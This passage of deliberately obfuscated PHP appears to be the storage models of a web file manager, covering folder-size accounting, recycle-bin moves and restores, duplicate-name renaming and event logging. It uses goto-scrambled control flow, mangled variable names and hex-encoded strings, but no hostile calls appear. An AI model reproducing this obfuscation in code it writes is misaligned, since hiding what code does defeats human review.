$_SERVER[œÕÊİğö]; $eñºµêŞİí = defined($B‰©ƒÒŒ¨[477]) ? USER_ID : $B‰©ƒÒŒ¨[201]; if (!$E©œ©øÑÂ) { return; } goto cÄŠÉ†‹•†; C“ö·äíí: } public function folderSizeReset($Eéˆ¹˜Ñ–¸, $BØ¢‡•˜… = false) { goto d„ÜÃõÆŠ»; cŠ„ºÏÑ•Î: $this->where($DğøÇ÷¾Ğ)->setAdd($cÒ¾¨ˆ¥¹[88], $BØ¢‡•˜…); CacheLock::unlock($b‘Ö½Œ³ ö); $a«îĞ‡•Ø = $cÒ¾¨ˆ¥¹[2009] . $C…óá¿Î‘[$cÒ¾¨ˆ¥¹[415]] . $cÒ¾¨ˆ¥¹[4] . $C…óá¿Î‘[$cÒ¾¨ˆ¥¹[507]]; goto Aå³¼âöá¾; A·éëæ: $Eë°”ùÇ[] = $C…óá¿Î‘[$cÒ¾¨ˆ¥¹[406]]; $DğøÇ÷¾Ğ = array($cÒ¾¨ˆ¥¹[406] => array($cÒ¾¨ˆ¥¹[422], $Eë°”ùÇ)); if ($BØ¢‡•˜… < 0) { $DğøÇ÷¾Ğ[$cÒ¾¨ˆ¥¹[88]] = array($cÒ¾¨ˆ¥¹[996], abs($BØ¢‡•˜…)); } goto cŠ„ºÏÑ•Î; fÑÀÅÓôìÃ: $b‘Ö½Œ³ ö = $cÒ¾¨ˆ¥¹[2008] . $Eéˆ¹˜Ñ–¸; CacheLock::lock($b‘Ö½Œ³ ö, 20); if ($BØ¢‡•˜… === !1) { $this->sourceCacheClear($Eéˆ¹˜Ñ–¸); $C…óá¿Î‘ = $this->sourceInfo($Eéˆ¹˜Ñ–¸); $DğøÇ÷¾Ğ = array($cÒ¾¨ˆ¥¹[405] => $Eéˆ¹˜Ñ–¸, $cÒ¾¨ˆ¥¹[433] => 0); $E”Ä§¶Ø¶‰ = $this->where($DğøÇ÷¾Ğ)->sum($cÒ¾¨ˆ¥¹[88]); $BØ¢‡•˜… = intval($E”Ä§¶Ø¶‰) - intval($C…óá¿Î‘[$cÒ¾¨ˆ¥¹[88]]); } goto BÛƒƒ­¤ÂÜ; BÛƒƒ­¤ÂÜ: if ($BØ¢‡•˜… == 0) { return CacheLock::unlock($b‘Ö½Œ³ ö); } $Eë°”ùÇ = $this->parentLevelArray($C…óá¿Î‘[$cÒ¾¨ˆ¥¹[524]]); if (!$Eë°”ùÇ) { $Eë°”ùÇ = array(); } goto A·éëæ; d„ÜÃõÆŠ»: $cÒ¾¨ˆ¥¹ =& $_SERVER[œÕÊİğö]; if ($this->statusIgnoreResetSpace) { return; } $C…óá¿Î‘ = $this->sourceInfo($Eéˆ¹˜Ñ–¸); goto fÑÀÅÓôìÃ; Aå³¼âöá¾: $f»¡•È“ö = array($C…óá¿Î‘[$cÒ¾¨ˆ¥¹[415]], $C…óá¿Î‘[$cÒ¾¨ˆ¥¹[507]]); TaskRun::timeLimitCall($a«îĞ‡•Ø, $cÒ¾¨ˆ¥¹[2010], $f»¡•È“ö, 1.5); goto a‘‡˜™Ë¾ñ; a‘‡˜™Ë¾ñ: } public function folderSizeResetChildren($aÜ³“İ„Ç) { goto eó¦êÙ®†©; fõŞÓ¹ÊéÄ: $C‚ÊµÔ ¹¸ = array($E³ëˆÏŒÇ[580] => 1, $E³ëˆÏŒÇ[587] => array($E³ëˆÏŒÇ[547], $Få°†§’³ò[$E³ëˆÏŒÇ[524]] . $aÜ³“İ„Ç . $E³ëˆÏŒÇ[548])); $d’ä¯££ÍĞ = $E³ëˆÏŒÇ[2011]; $Eƒ£­¢¥œ = $this->field($d’ä¯££ÍĞ)->where($C‚ÊµÔ ¹¸)->select(); goto Cå¥³ÍÔÕğ; fğêÅÍÄÛˆ: $Eƒ£­¢¥œ[] = $Få°†§’³ò; $Eƒ£­¢¥œ = array_to_keyvalue($Eƒ£­¢¥œ, $E³ëˆÏŒÇ[406]); foreach ($Eƒ£­¢¥œ as $bÆ†…¼Èè => $cÔïÙñÌ’”) { $Eƒ£­¢¥œ[$bÆ†…¼Èè][$E³ëˆÏŒÇ[2012]] = $Eƒ£­¢¥œ[$bÆ†…¼Èè][$E³ëˆÏŒÇ[88]]; $Eƒ£­¢¥œ[$bÆ†…¼Èè][$E³ëˆÏŒÇ[88]] = 0; } goto fÎÒ»ø»²½; fÎÒ»ø»²½: foreach ($bÂß—ßêâë as $cÔïÙñÌ’”) { $EÍó»ƒÃåŒ = $cÔïÙñÌ’”[$E³ëˆÏŒÇ[501]] . $E³ëˆÏŒÇ[43]; if (!isset($Eƒ£­¢¥œ[$EÍó»ƒÃåŒ])) { continue; } if ($cÔïÙñÌ’”[$E³ëˆÏŒÇ[434]] == $Eƒ£­¢¥œ[$EÍó»ƒÃåŒ][$E³ëˆÏŒÇ[434]]) { $Eƒ£­¢¥œ[$EÍó»ƒÃåŒ][$E³ëˆÏŒÇ[88]] += $cÔïÙñÌ’”[$E³ëˆÏŒÇ[88]]; } } foreach ($Eƒ£­¢¥œ as $cÔïÙñÌ’”) { $fŠã¹Î¤Œ§ = $this->parentLevelArray($cÔïÙñÌ’”[$E³ëˆÏŒÇ[524]]); foreach ($fŠã¹Î¤Œ§ as $EÍó»ƒÃåŒ) { $EÍó»ƒÃåŒ = $EÍó»ƒÃåŒ . $E³ëˆÏŒÇ[43]; if (!isset($Eƒ£­¢¥œ[$EÍó»ƒÃåŒ])) { continue; } if ($cÔïÙñÌ’”[$E³ëˆÏŒÇ[434]] == $Eƒ£­¢¥œ[$EÍó»ƒÃåŒ][$E³ëˆÏŒÇ[434]]) { $Eƒ£­¢¥œ[$EÍó»ƒÃåŒ][$E³ëˆÏŒÇ[88]] += $cÔïÙñÌ’”[$E³ëˆÏŒÇ[88]]; } } } $e¼ÊÖÒõÖ = array(); goto aÛ†İê¥; Cå¥³ÍÔÕğ: $C‚ÊµÔ ¹¸[$E³ëˆÏŒÇ[414]] = 0; $bÂß—ßêâë = $this->field($d’ä¯££ÍĞ)->where($C‚ÊµÔ ¹¸)->select(); if (!$bÂß—ßêâë) { return; } goto fğêÅÍÄÛˆ; eó¦êÙ®†©: $E³ëˆÏŒÇ =& $_SERVER[œÕÊİğö]; $this->sourceCacheClear($aÜ³“İ„Ç); $Få°†§’³ò = $this->sourceInfo($aÜ³“İ„Ç); goto fõŞÓ¹ÊéÄ; aÛ†İê¥: foreach ($Eƒ£­¢¥œ as $cÔïÙñÌ’”) { if ($cÔïÙñÌ’”[$E³ëˆÏŒÇ[88]] == $cÔïÙñÌ’”[$E³ëˆÏŒÇ[2012]]) { continue; } $e¼ÊÖÒõÖ[] = array($E³ëˆÏŒÇ[406], $cÔïÙñÌ’”[$E³ëˆÏŒÇ[406]], $E³ëˆÏŒÇ[88], $cÔïÙñÌ’”[$E³ëˆÏŒÇ[88]]); } $this->saveAll($e¼ÊÖÒõÖ); goto fÜèÒæî÷à; fÜèÒæî÷à: } public function userSpaceReset($a‚ËŒ·øèó = false) { $F…ˆ„—‘É =& $_SERVER[œÕÊİğö]; $c›½Ìé³¼ = $this->where(array($F…ˆ„—‘É[415] => self::TYPE_USER, $F…ˆ„—‘É[507] => $a‚ËŒ·øèó, $F…ˆ„—‘É[414] => 0))->sum($F…ˆ„—‘É[88]); $c›½Ìé³¼ = !$c›½Ìé³¼ || $c›½Ìé³¼ <= 0 ? 0 : $c›½Ìé³¼; Model($F…ˆ„—‘É[516])->userEdit($a‚ËŒ·øèó, array($F…ˆ„—‘É[1706] => $c›½Ìé³¼)); } public function targetSpaceUpdate($AÍ˜‚ŸÜ¡È, $d—ŸÌ×÷Œ) { $Eè¡ù˜÷Ö‡ =& $_SERVER[œÕÊİğö]; if (!$d—ŸÌ×÷Œ) { return; } if (!in_array($AÍ˜‚ŸÜ¡È, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $D‚¨À¾ÉÛç = $this->targetSpaceSize($AÍ˜‚ŸÜ¡È, $d—ŸÌ×÷Œ); if ($AÍ˜‚ŸÜ¡È == self::TYPE_USER) { Model($Eè¡ù˜÷Ö‡[516])->userEdit($d—ŸÌ×÷Œ, array($Eè¡ù˜÷Ö‡[1706] => $D‚¨À¾ÉÛç)); } else { if ($AÍ˜‚ŸÜ¡È == self::TYPE_GROUP) { Model($Eè¡ù˜÷Ö‡[525])->groupEdit($d—ŸÌ×÷Œ, array($Eè¡ù˜÷Ö‡[1706] => $D‚¨À¾ÉÛç)); } } } public function targetSpaceSize($C‘ĞÁÅ¼äô, $d’±¯¶„Í½) { goto e…åèĞ¡´; b Œˆ°àùİ: $aÖ°áÂè¹¯ = floatval($b§ê±âŒ´Š[$F·§¿—ì…Ù[88]]); $BÆèÅï³­ñ = array($F·§¿—ì…Ù[587] => array($F·§¿—ì…Ù[547], $F·§¿—ì…Ù[534] . $b§ê±âŒ´Š[$F·§¿—ì…Ù[406]] . $F·§¿—ì…Ù[548])); $B†¯•ÚŒ¦‹ = Model($F·§¿—ì…Ù[432])->field($F·§¿—ì…Ù[421])->where($BÆèÅï³­ñ)->select(); goto b”»ÉÇ÷ğ; b”»ÉÇ÷ğ: $B†¯•ÚŒ¦‹ = array_to_keyvalue($B†¯•ÚŒ¦‹, $F·§¿—ì…Ù[43], $F·§¿—ì…Ù[406]); $B†¯•ÚŒ¦‹ = array_unique(array_filter($B†¯•ÚŒ¦‹)); if ($B†¯•ÚŒ¦‹) { $BÆèÅï³­ñ = array($F·§¿—ì…Ù[421] => array($F·§¿—ì…Ù[422], $B†¯•ÚŒ¦‹)); $aÖ°áÂè¹¯ += floatval($this->where($BÆèÅï³­ñ)->sum($F·§¿—ì…Ù[88])); } goto c‡‡©«Œ¬; e…åèĞ¡´: $F·§¿—ì…Ù =& $_SERVER[œÕÊİğö]; $b§ê±âŒ´Š = $this->sourceRoot($C‘ĞÁÅ¼äô, $d’±¯¶„Í½, !0); if (!$b§ê±âŒ´Š) { return 0; } goto b Œˆ°àùİ; c‡‡©«Œ¬: $aÖ°áÂè¹¯ = !$aÖ°áÂè¹¯ || $aÖ°áÂè¹¯ <= 0 ? 0 : $aÖ°áÂè¹¯; return $aÖ°áÂè¹¯; goto fŠËâĞ„£§; fŠËâĞ„£§: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($bˆŒ½æ¾ôÓ) { return $this->fileTypeProfile($bˆŒ½æ¾ôÓ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($báÈĞÛÍ‰Ë) { return $this->fileTypeProfile($báÈĞÛÍ‰Ë, SourceModel::TYPE_GROUP); } private function fileTypeProfile($eë¶ø„¦Â, $Fğƒ…÷Ô™) { goto DÆ×ˆ£˜¶¨; DÆ×ˆ£˜¶¨: $B–õ‚å¹Æá =& $_SERVER[œÕÊİğö]; $d°ŒÒ²‰¤Õ = $B–õ‚å¹Æá[2013] . $eë¶ø„¦Â . $B–õ‚å¹Æá[81] . $Fğƒ…÷Ô™; $aÑ”àğ¼† = Cache::get($d°ŒÒ²‰¤Õ); goto EÜ’ÅùÉ»; B‹êªõöø: $f¼°¦ğÑ… = array(); $f¼°¦ğÑ…[$B–õ‚å¹Æá[2014]] = array($B–õ‚å¹Æá[2015] => LNG($B–õ‚å¹Æá[2014]), $B–õ‚å¹Æá[2016] => $this->where($Fà¼ÙøÓ)->count(), $B–õ‚å¹Æá[582] => $this->where($Fà¼ÙøÓ)->sum($B–õ‚å¹Æá[88])); $D…İÈòÓ•½ = KodIO::fileTypeList(); goto Cí¹ïÉƒƒå; EÜ’ÅùÉ»: if ($aÑ”àğ¼†) { return $aÑ”àğ¼†; } $Fà¼ÙøÓ = array($B–õ‚å¹Æá[580] => 0); if ($eë¶ø„¦Â != !1) { $Fà¼ÙøÓ[$B–õ‚å¹Æá[507]] = $eë¶ø„¦Â; $Fà¼ÙøÓ[$B–õ‚å¹Æá[415]] = $Fğƒ…÷Ô™; } goto B‹êªõöø; Cí¹ïÉƒƒå: foreach ($D…İÈòÓ•½ as $cÒ”…¼Ùº– => $c†´æ†‡æ”) { $Fà¼ÙøÓ[$B–õ‚å¹Æá[416]] = $this->fileTypeWhere($cÒ”…¼Ùº–); $f¼°¦ğÑ…[$cÒ”…¼Ùº–] = array($B–õ‚å¹Æá[2015] => $c†´æ†‡æ”[$B–õ‚å¹Æá[38]], $B–õ‚å¹Æá[2016] => $this->where($Fà¼ÙøÓ)->count(), $B–õ‚å¹Æá[582] => $this->where($Fà¼ÙøÓ)->sum($B–õ‚å¹Æá[88])); } Cache::set($d°ŒÒ²‰¤Õ, $f¼°¦ğÑ…, 1200); return $f¼°¦ğÑ…; goto c”ßÚš¦Æ; c”ßÚš¦Æ: } public function fileNameExist($E™Ò—˜ˆ, $bÆ’áßÎ¡) { $c—è‹ºã”ñ =& $_SERVER[œÕÊİğö]; $E¡çÖîŒø = $this->where(array($c—è‹ºã”ñ[501] => $E™Ò—˜ˆ, $c—è‹ºã”ñ[38] => $bÆ’áßÎ¡, $c—è‹ºã”ñ[434] => 0))->find(); return is_array($E¡çÖîŒø) ? $E¡çÖîŒø[$c—è‹ºã”ñ[406]] : !1; } public function childList($aŒÆ¤²ÓÔˆ) { goto E¿ôàéÙŸÁ; e®ÕŸïìŠà: self::$cacheChildList[$D ßÖˆ¯ß] = $Dâ­õì¸Ä; foreach ($Dâ­õì¸Ä as $e¸Ë“ÑÓÓ) { $D ßÖˆ¯ß = $E´ÒÑÁƒ¡[461] . $e¸Ë“ÑÓÓ[$E´ÒÑÁƒ¡[406]]; self::$cacheSourceInfo[$D ßÖˆ¯ß] = $e¸Ë“ÑÓÓ; } return $Dâ­õì¸Ä; goto E¦£İÌ¯Ûˆ; E¿ôàéÙŸÁ: $E´ÒÑÁƒ¡ =& $_SERVER[œÕÊİğö]; $D ßÖˆ¯ß = $E´ÒÑÁƒ¡[1991] . $aŒÆ¤²ÓÔˆ; if (isset(self::$cacheChildList[$D ßÖˆ¯ß])) { return self::$cacheChildList[$D ßÖˆ¯ß]; } goto CÛ¤Á‰¹; CÛ¤Á‰¹: $f‡œ±—öó = array($E´ÒÑÁƒ¡[501] => intval($aŒÆ¤²ÓÔˆ), $E´ÒÑÁƒ¡[434] => 0); $Dâ­õì¸Ä = $this->where($f‡œ±—öó)->select(); $Dâ­õì¸Ä = $Dâ­õì¸Ä ? $Dâ­õì¸Ä : array(); goto e®ÕŸïìŠà; E¦£İÌ¯Ûˆ: } public function fileNameAuto($c×µ«ã¢”Ô, $a›¯ÈïĞ¯›, $c§Íª–²éí = REPEAT_RENAME, $b–ä¦›º„† = false) { $EÊ¼¶”Šµ” =& $_SERVER[œÕÊİğö]; $B°Ã‚ÓÜµö = array($EÊ¼¶”Šµ”[501] => $c×µ«ã¢”Ô, $EÊ¼¶”Šµ”[434] => 0, $EÊ¼¶”Šµ”[38] => array($EÊ¼¶”Šµ”[390], $a›¯ÈïĞ¯› . $EÊ¼¶”Šµ”[391])); $c‰î¬Şªõ = $this->field($EÊ¼¶”Šµ”[38])->where($B°Ã‚ÓÜµö)->select(); $Bì¤”âñ’ = array_to_keyvalue($c‰î¬Şªõ, $EÊ¼¶”Šµ”[43], $EÊ¼¶”Šµ”[38]); return $this->fileNameAutoGet($Bì¤”âñ’, $a›¯ÈïĞ¯›, $c§Íª–²éí, $b–ä¦›º„†); } public function fileNameAutoGet($D‰‹Ò¦†¶°, $C·»ï­Ö‰ã, $cÇ¸õ’º˜, $aë•ƒğ´£ô) { $bÏ¸Û±šÉ =& $_SERVER[œÕÊİğö]; if ($cÇ¸õ’º˜ == REPEAT_REPLACE || !$D‰‹Ò¦†¶° || !in_array_not_case($C·»ï­Ö‰ã, $D‰‹Ò¦†¶°) || $aë•ƒğ´£ô && $cÇ¸õ’º˜ != REPEAT_RENAME_FOLDER) { return $C·»ï­Ö‰ã; } if ($cÇ¸õ’º˜ == REPEAT_SKIP) { return !1; } $A½…‹ñğí” = $bÏ¸Û±šÉ[105] . get_path_ext($C·»ï­Ö‰ã); $A½…‹ñğí” = $A½…‹ñğí” == $bÏ¸Û±šÉ[105] || $aë•ƒğ´£ô ? $bÏ¸Û±šÉ[43] : $A½…‹ñğí”; for ($E»Ó·¡ÒÍš = 1; $E»Ó·¡ÒÍš <= count($D‰‹Ò¦†¶°) + 1; $E»Ó·¡ÒÍš++) { $dùôÂ®»»¢ = substr($C·»ï­Ö‰ã, 0, strlen($C·»ï­Ö‰ã) - strlen($A½…‹ñğí”)); $fïáª¡šÊª = $dùôÂ®»»¢ . "\x28{$E»Ó·¡ÒÍš}\x29{$A½…‹ñğí”}"; if (!in_array_not_case($fïáª¡šÊª, $D‰‹Ò¦†¶°)) { return $fïáª¡šÊª; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\x63\x65\x5f\x72\x65\x63\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\x69\155\145", "\164\x69\x6d\145", "\x69\x6e\x73\145\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($C¤¾„ğ¶¦ = false) { $b¶ìÂÓ±õÅ =& $_SERVER[œÕÊİğö]; $C¤¾„ğ¶¦ = $C¤¾„ğ¶¦ ? $C¤¾„ğ¶¦ : USER_ID; $cÜë»Û¦’ç = $this->where(array($b¶ìÂÓ±õÅ[1542] => $C¤¾„ğ¶¦))->select(); return array_to_keyvalue($cÜë»Û¦’ç, $b¶ìÂÓ±õÅ[43], $b¶ìÂÓ±õÅ[406]); } public function moveToRecycle($EËö·‡½–Ê) { goto d«ì‹‘˜òë; e§…ì³†éÜ: if (!$bœ³×¦ê—å || $bœ³×¦ê—å[$cõİÆ‹Ì‚œ[434]] == $cõİÆ‹Ì‚œ[97]) { return; } $fÃ†ÂÃÂ« = array($cõİÆ‹Ì‚œ[421] => $EËö·‡½–Ê, $cõİÆ‹Ì‚œ[1542] => USER_ID, $cõİÆ‹Ì‚œ[583] => $bœ³×¦ê—å[$cõİÆ‹Ì‚œ[415]], $cõİÆ‹Ì‚œ[584] => $bœ³×¦ê—å[$cõİÆ‹Ì‚œ[507]], $cõİÆ‹Ì‚œ[587] => $bœ³×¦ê—å[$cõİÆ‹Ì‚œ[524]]); $this->add($fÃ†ÂÃÂ«); goto d°Ğœ–õ±Ù; d°Ğœ–õ±Ù: $this->recycleMove($EËö·‡½–Ê, 1); if ($bœ³×¦ê—å[$cõİÆ‹Ì‚œ[414]] == $cõİÆ‹Ì‚œ[97]) { $CÇåù¾’‹’ = array($cõİÆ‹Ì‚œ[587] => array($cõİÆ‹Ì‚œ[547], $bœ³×¦ê—å[$cõİÆ‹Ì‚œ[524]] . $EËö·‡½–Ê . $cõİÆ‹Ì‚œ[548])); $d‘ÔåÖ½ïß->where($CÇåù¾’‹’)->setField($cõİÆ‹Ì‚œ[434], 1); } goto D¯™ŒÂŠé; d«ì‹‘˜òë: $cõİÆ‹Ì‚œ =& $_SERVER[œÕÊİğö]; $d‘ÔåÖ½ïß = Model($cõİÆ‹Ì‚œ[1228]); $bœ³×¦ê—å = $d‘ÔåÖ½ïß->sourceInfo($EËö·‡½–Ê); goto e§…ì³†éÜ; D¯™ŒÂŠé: } public function clear() { $this->remove(!1); } public function remove($cˆéõ­Ê³Ú = false, $FÌº†…÷œ¡ = false) { goto aâÁò½Ì›; b‰ˆÆ®„ö: foreach ($C…êÚ¦Å†¼ as $FÑä†Š¨³) { if ($cˆéõ­Ê³Ú != !1 && !in_array($FÑä†Š¨³, $cˆéõ­Ê³Ú)) { continue; } $BŠ˜œ¶·Û = $aë»Ô§Ö÷Ï->sourceInfo($FÑä†Š¨³); $aë»Ô§Ö÷Ï->remove($FÑä†Š¨³, !1); $Eï¦²‹ÓÇâ = $BŠ˜œ¶·Û[$Eêœ®èô³Û[415]] . $Eêœ®èô³Û[81] . $BŠ˜œ¶·Û[$Eêœ®èô³Û[507]]; $cŒ¦Æ³£ÑŒ[$Eï¦²‹ÓÇâ] = array($Eêœ®èô³Û[583] => $BŠ˜œ¶·Û[$Eêœ®èô³Û[415]], $Eêœ®èô³Û[507] => $BŠ˜œ¶·Û[$Eêœ®èô³Û[507]]); $this->where(array($Eêœ®èô³Û[406] => $FÑä†Š¨³))->delete(); } foreach ($cŒ¦Æ³£ÑŒ as $eÓËå³ÊÀ¡) { $aë»Ô§Ö÷Ï->targetSpaceUpdate($eÓËå³ÊÀ¡[$Eêœ®èô³Û[415]], $eÓËå³ÊÀ¡[$Eêœ®èô³Û[507]]); } goto c½§®ÄÓ’ô; aâÁò½Ì›: $Eêœ®èô³Û =& $_SERVER[œÕÊİğö]; $FÌº†…÷œ¡ = $FÌº†…÷œ¡ ? $FÌº†…÷œ¡ : USER_ID; $aë»Ô§Ö÷Ï = Model($Eêœ®èô³Û[1228]); goto eÛ­áŒ‚ÊÇ; eÛ­áŒ‚ÊÇ: $C…êÚ¦Å†¼ = $this->listData($FÌº†…÷œ¡); $cˆéõ­Ê³Ú = $cˆéõ­Ê³Ú === !1 ? !1 : $cˆéõ­Ê³Ú; $cŒ¦Æ³£ÑŒ = array(); goto b‰ˆÆ®„ö; c½§®ÄÓ’ô: } public function restore($d†ÈÎÖÜ‰ = false) { $eŒÎÂ²ÚÖ§ = $this->listData(); $this->_restoreSource($eŒÎÂ²ÚÖ§, $d†ÈÎÖÜ‰); } public function removeUserAll($C·ÌÆöö¾Æ) { $this->remove(!1, $C·ÌÆöö¾Æ); } private function _restoreSource($F’‘‹°¹ß°, $Dª×Âª·Š“) { goto B†«Ô‰™½¾; aÀ°×ÍŸÇŠ: if (!$F’‘‹°¹ß°) { return !0; } $Cõêí°Ö = array(); foreach ($F’‘‹°¹ß° as $bÚˆâ¦ï‘Ô) { goto dï‚çÚŒ¾Í; eŒÆšÑ¹: $Cõêí°Ö[] = $A†óè£¦¶‘[$b“¢ëŒ¿Ö[501]]; if ($A†óè£¦¶‘[$b“¢ëŒ¿Ö[414]] == $b“¢ëŒ¿Ö[97]) { $Cõêí°Ö[] = $bÚˆâ¦ï‘Ô; } $Cğ¡Œ…ÙØ‚->lockMoveEnd($bÚˆâ¦ï‘Ô); goto eçö‹å‰ñ»; c‚ÅŒŠŠ•Ş: if ($A†óè£¦¶‘[$b“¢ëŒ¿Ö[414]] == $b“¢ëŒ¿Ö[97]) { $aèœ¹òæ = array($b“¢ëŒ¿Ö[587] => array($b“¢ëŒ¿Ö[547], $A†óè£¦¶‘[$b“¢ëŒ¿Ö[524]] . $bÚˆâ¦ï‘Ô . $b“¢ëŒ¿Ö[548])); $Cğ¡Œ…ÙØ‚->where($aèœ¹òæ)->setField($b“¢ëŒ¿Ö[434], 0); $this->restoreFolderChildren($bÚˆâ¦ï‘Ô, $F’‘‹°¹ß°); } $this->where(array($b“¢ëŒ¿Ö[406] => $bÚˆâ¦ï‘Ô))->delete(); $Cğ¡Œ…ÙØ‚->folderSizeReset($A†óè£¦¶‘[$b“¢ëŒ¿Ö[501]]); goto eŒÆšÑ¹; F†ùõĞâŒ£: if ($eØİøˆô[$b“¢ëŒ¿Ö[434]] == $b“¢ëŒ¿Ö[97]) { continue; } $Cğ¡Œ…ÙØ‚->lockMoveStart($bÚˆâ¦ï‘Ô); $this->recycleMove($bÚˆâ¦ï‘Ô, 0); goto c‚ÅŒŠŠ•Ş; dï‚çÚŒ¾Í: if ($Dª×Âª·Š“ != !1 && !in_array($bÚˆâ¦ï‘Ô, $Dª×Âª·Š“)) { continue; } $A†óè£¦¶‘ = $Cğ¡Œ…ÙØ‚->sourceInfo($bÚˆâ¦ï‘Ô); $eØİøˆô = $Cğ¡Œ…ÙØ‚->sourceInfo($A†óè£¦¶‘[$b“¢ëŒ¿Ö[501]]); goto F†ùõĞâŒ£; eçö‹å‰ñ»: } goto eŸãê‚«ñ; B†«Ô‰™½¾: $b“¢ëŒ¿Ö =& $_SERVER[œÕÊİğö]; $Cğ¡Œ…ÙØ‚ = Model($b“¢ëŒ¿Ö[1228]); $Dª×Âª·Š“ = $Dª×Âª·Š“ == !1 ? !1 : $Dª×Âª·Š“; goto aÀ°×ÍŸÇŠ; eŸãê‚«ñ: $Cğ¡Œ…ÙØ‚->updateModifyTime($Cõêí°Ö); goto DïƒØéÇí—; DïƒØéÇí—: } private function restoreFolderChildren($cˆƒÔÃÖ‘Ş, $fëË½ÌòªÌ) { goto F–µÑñ‚°Š; f´‡’¶„ƒ: $BÆ”¦˜ÌÂ‚[$bƒ„¬Áš‡[406]][1] = array_unique($BÆ”¦˜ÌÂ‚[$bƒ„¬Áš‡[406]][1]); $BÆ”¦˜ÌÂ‚[$bƒ„¬Áš‡[981]] = $bƒ„¬Áš‡[1812]; $B„ïÓ‰ÍİÔ->where($BÆ”¦˜ÌÂ‚)->setField($bƒ„¬Áš‡[434], 1); goto c…©‘§Ã; F–µÑñ‚°Š: $bƒ„¬Áš‡ =& $_SERVER[œÕÊİğö]; $B„ïÓ‰ÍİÔ = Model($bƒ„¬Áš‡[1228]); $BÆ”¦˜ÌÂ‚ = array($bƒ„¬Áš‡[406] => array($bƒ„¬Áš‡[7], array())); goto cÆâÊ‡­à¸; cÆâÊ‡­à¸: foreach ($fëË½ÌòªÌ as $AÂ®ôÜ¢‹) { if ($AÂ®ôÜ¢‹ == $cˆƒÔÃÖ‘Ş) { continue; } if (!$B„ïÓ‰ÍİÔ->isParentOf($cˆƒÔÃÖ‘Ş, $AÂ®ôÜ¢‹)) { continue; } $b—ìˆ ™ˆ— = $B„ïÓ‰ÍİÔ->sourceInfo($AÂ®ôÜ¢‹); if ($b—ìˆ ™ˆ—[$bƒ„¬Áš‡[414]] == $bƒ„¬Áš‡[97]) { $BÆ”¦˜ÌÂ‚[] = array($bƒ„¬Áš‡[587] => array($bƒ„¬Áš‡[547], $b—ìˆ ™ˆ—[$bƒ„¬Áš‡[524]] . $AÂ®ôÜ¢‹ . $bƒ„¬Áš‡[548])); } else { $BÆ”¦˜ÌÂ‚[$bƒ„¬Áš‡[406]][1][] = $AÂ®ôÜ¢‹; } } if (!$BÆ”¦˜ÌÂ‚[$bƒ„¬Áš‡[406]][1]) { unset($BÆ”¦˜ÌÂ‚[$bƒ„¬Áš‡[406]]); } if (!$BÆ”¦˜ÌÂ‚) { return; } goto f´‡’¶„ƒ; c…©‘§Ã: } private function recycleMove($FÀªšË‚Ê§, $Cö˜¤’˜ã = 1) { $fº•®¬‘Ó„ =& $_SERVER[œÕÊİğö]; $FŞ“‚Û†ó‚ = Model($fº•®¬‘Ó„[1228]); $F·¶ÁŠ‹³É = Model($fº•®¬‘Ó„[2017]); $aÀƒøÇïªĞ = array($fº•®¬‘Ó„[406] => $FÀªšË‚Ê§); if ($Cö˜¤’˜ã) { $FŞ“‚Û†ó‚->where($aÀƒøÇïªĞ)->setField($fº•®¬‘Ó„[434], 1); $F·¶ÁŠ‹³É->eventRecycle($FÀªšË‚Ê§, $fº•®¬‘Ó„[2018]); } else { $cÛœÉîœÌÃ = $FŞ“‚Û†ó‚->where($aÀƒøÇïªĞ)->find(); $C…ïÖÏ”… = $cÛœÉîœÌÃ[$fº•®¬‘Ó„[414]] == $fº•®¬‘Ó„[97]; $fƒ¨Û‡İî = $FŞ“‚Û†ó‚->fileNameAuto($cÛœÉîœÌÃ[$fº•®¬‘Ó„[501]], $cÛœÉîœÌÃ[$fº•®¬‘Ó„[38]], REPEAT_RENAME_FOLDER, $C…ïÖÏ”…); if ($fƒ¨Û‡İî != $cÛœÉîœÌÃ[$fº•®¬‘Ó„[38]]) { $FŞ“‚Û†ó‚->rename($FÀªšË‚Ê§, $fƒ¨Û‡İî); } $FŞ“‚Û†ó‚->where($aÀƒøÇïªĞ)->setField($fº•®¬‘Ó„[434], 0); $F·¶ÁŠ‹³É->eventRecycle($FÀªšË‚Ê§, $fº•®¬‘Ó„[2019]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x73\157\165\x72\143\x65\123\x65\x63\162\145\x74\114\x69\x73\x74"; public $field = array("\x73\157\x75\162\x63\145\x49\104", "\164\x79\160\145\111\x44", "\x63\x72\x65\x61\x74\145\x55\x73\x65\x72"); } goto aé°…â“¾; Cñ•ÕÇÂÑ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\x65\x5f\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\x66\165\x6e\x63\164\151\157\x6e"), array("\144\145\x73\x63", '', "\151\x6e\163\145\x72\164\54\x75\x70\144\x61\164\145\x2c\x73\145\x6c\x65\143\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($D†ÈùŒÕªİ, $e‰ğ‹èßÔù, $FÜ­éÇ¥ç = '') { goto e÷äã½†½š; eØ°·‡¹ï»: if (!$CÔÕ§„†ˆ) { return !1; } if ($this->isCacheEvent($CÔÕ§„†ˆ, $e‰ğ‹èßÔù)) { return; } if ($FÜ­éÇ¥ç && is_string($FÜ­éÇ¥ç)) { $FÜ­éÇ¥ç = array($dˆ‡¦†ƒ§ù[1758] => $FÜ­éÇ¥ç); } goto CÆ”ñöß¿; e÷äã½†½š: $dˆ‡¦†ƒ§ù =& $_SERVER[œÕÊİğö]; if (!$this->eventSave) { return; } $CÔÕ§„†ˆ = Model($dˆ‡¦†ƒ§ù[1228])->sourceInfo($D†ÈùŒÕªİ); goto eØ°·‡¹ï»; aÌ°óïšŞó: return $this->add($EÆæ¦ãîÒ—); goto FÉã„‰Ì„Å; CÆ”ñöß¿: $EÆæ¦ãîÒ— = array($dˆ‡¦†ƒ§ù[421] => 